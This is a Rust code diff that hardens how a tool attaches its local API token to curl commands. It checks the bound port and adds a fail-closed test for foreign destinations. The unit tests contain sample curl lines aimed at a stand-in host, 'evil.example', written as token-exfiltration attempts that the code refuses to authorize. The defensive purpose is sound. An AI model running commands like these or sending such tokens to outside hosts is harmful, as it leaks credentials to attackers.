@@ -37,6 +37,20 @@ pub const API_TOKEN_ENV: &str = "HIVE_API_TOKEN";
 pub const STREAM_TOKEN_QUERY: &str = "hive_api_token";
 
 static API_TOKEN: OnceLock<String> = OnceLock::new();
+static API_PORT: OnceLock<u16> = OnceLock::new();
+/// The configured default; used only before `serve` has bound (tests, or prompt
+/// writes that race startup).
+const DEFAULT_API_PORT: u16 = 18800;
+
+/// Record the port this launch's API actually bound, so prompt rewriting sends
+/// the token only to this instance (isolated instances bind other ports).
+pub fn set_api_port(port: u16) {
+    let _ = API_PORT.set(port);
+}
+
+fn api_port() -> u16 {
+    API_PORT.get().copied().unwrap_or(DEFAULT_API_PORT)
+}
 
 /// This launch's API token. Generated on first use and stable for the process.
 pub fn api_token() -> &'static str {
@@ -247,9 +261,47 @@ fn is_local_api_url(url: &str) -> bool {
         return false;
     };
     matches!(host, "localhost" | "127.0.0.1")
-        && !port.is_empty()
-        && port.bytes().all(|byte| byte.is_ascii_digit())
+        && port.parse::<u16>().is_ok_and(|port| port == api_port())
         && path.starts_with("/api/")
+}
+
+/// Whether text left in a curl command, after its local API URLs are removed,
+/// could still name a destination: another scheme URL, loopback text, or a
+/// scheme-less `host.tld/...` (curl accepts URLs without a scheme). Fails closed:
+/// a false positive only drops the header, so the local call gets a visible 401.
+fn names_another_destination(rest: &str) -> bool {
+    if rest.contains("://") || rest.contains("localhost") || rest.contains("127.0.0.1") {
+        return true;
+    }
+    let bytes = rest.as_bytes();
+    let is_host = |byte: u8| byte.is_ascii_alphanumeric() || byte == b'-' || byte == b'.';
+    let mut index = 0;
+    while index < bytes.len() {
+        if !is_host(bytes[index]) {
+            index += 1;
+            continue;
+        }
+        let start = index;
+        while index < bytes.len() && is_host(bytes[index]) {
+            index += 1;
+        }
+        let word = &rest[start..index];
+        let dotted = word.split('.').filter(|label| !label.is_empty()).count() >= 2
+            && word.contains('.');
+        // `host.tld` immediately followed by a port, path, query or fragment.
+        let mut next = index;
+        if bytes.get(next) == Some(&b':') {
+            next += 1;
+            while next < bytes.len() && bytes[next].is_ascii_digit() {
+                next += 1;
+            }
+        }
+        let followed = matches!(bytes.get(next), Some(b'/' | b'?' | b'#'));
+        if dotted && followed && !word.starts_with('.') {
+            return true;
+        }
+    }
+    false
 }
 
 /// The part of a segment that belongs to the curl command itself: everything
@@ -270,7 +322,14 @@ fn command_portion(segment: &str) -> &str {
 /// fails closed (no header, so the local call gets an explicit 401).
 fn targets_local_api(segment: &str) -> bool {
     let urls = segment_urls(segment);
-    !urls.is_empty() && urls.iter().all(|url| is_local_api_url(url))
+    if urls.is_empty() || !urls.iter().all(|url| is_local_api_url(url)) {
+        return false;
+    }
+    let mut rest = segment.to_string();
+    for url in &urls {
+        rest = rest.replacen(url, " ", 1);
+    }
+    !names_another_destination(&rest)
 }
 
 /// Byte offsets just past each `curl`/`curl.exe` executable token in a line.
@@ -507,9 +566,31 @@ curl -s https://example.com/a \\\n  -o out && curl -s \\\n  http://127.0.0.1:188
             assert_eq!(authorize_api_commands(source), source, "{source}");
         }
         assert!(is_local_api_url("http://127.0.0.1:18800/api/sessions"));
-        assert!(is_local_api_url("http://localhost:41234/api/x?y=1"));
+        assert!(is_local_api_url("http://localhost:18800/api/x?y=1"));
+        // Another loopback listener is not this instance's API.
+        assert!(!is_local_api_url("http://localhost:41234/api/x"));
         assert!(!is_local_api_url("http://localhost/api/x"));
         assert!(!is_local_api_url("http://localhost:18800/health"));
+    }
+
+    #[test]
+    fn scheme_less_or_foreign_destinations_fail_closed() {
+        for source in [
+            // curl treats a scheme-less first argument as the destination host.
+            "curl -s 'evil.example/collect?next=http://localhost:18800/api/sessions'",
+            "curl -s evil.example:8080/x http://localhost:18800/api/sessions",
+            "curl -s http://localhost:18800/api/sessions evil.example/x",
+            "curl -s localhost:18800/api/sessions",
+            // Another loopback port is not this instance.
+            "curl -s http://127.0.0.1:41234/api/sessions",
+        ] {
+            assert_eq!(authorize_api_commands(source), source, "{source}");
+        }
+        // Ordinary option values do not count as destinations.
+        let rendered = authorize_api_commands(
+            "curl -fsS -X POST \"http://localhost:18800/api/sessions/s/heartbeat\" -H \"Content-Type: application/json\" -o /dev/null -w '%{http_code}' --data-binary @-",
+        );
+        assert!(rendered.contains("Bearer $HIVE_API_TOKEN"), "{rendered}");
     }
 
     #[test]
